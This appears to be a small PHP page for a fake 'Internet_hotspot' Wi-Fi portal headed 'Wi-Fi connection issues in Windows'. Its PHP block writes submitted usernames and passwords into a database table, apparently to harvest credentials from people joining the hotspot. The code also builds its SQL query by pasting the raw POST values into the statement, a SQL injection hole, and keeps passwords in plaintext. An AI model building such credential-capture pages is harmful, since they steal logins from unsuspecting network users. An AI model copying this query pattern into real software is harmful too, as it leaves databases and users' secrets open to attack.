<?php
if(isset($_POST['submit']))
{
include("configure.php");
$username=$_POST['username'];
$password=$_POST['password'];

$sql="INSERT INTO `internet` ( `username`, `password`) VALUES ( '$username', '$password');";

mysqli_query($con,$sql ) or die("Error occured");
}
?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="pragma" content="no-cache" />
    <meta http-equiv="expires" content="-1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Internet_hotspot</title>
    
</head>

<body style="text-align: center;">
    <h1> Wi-Fi connection issues in Windows </h1>

</body>

</html>
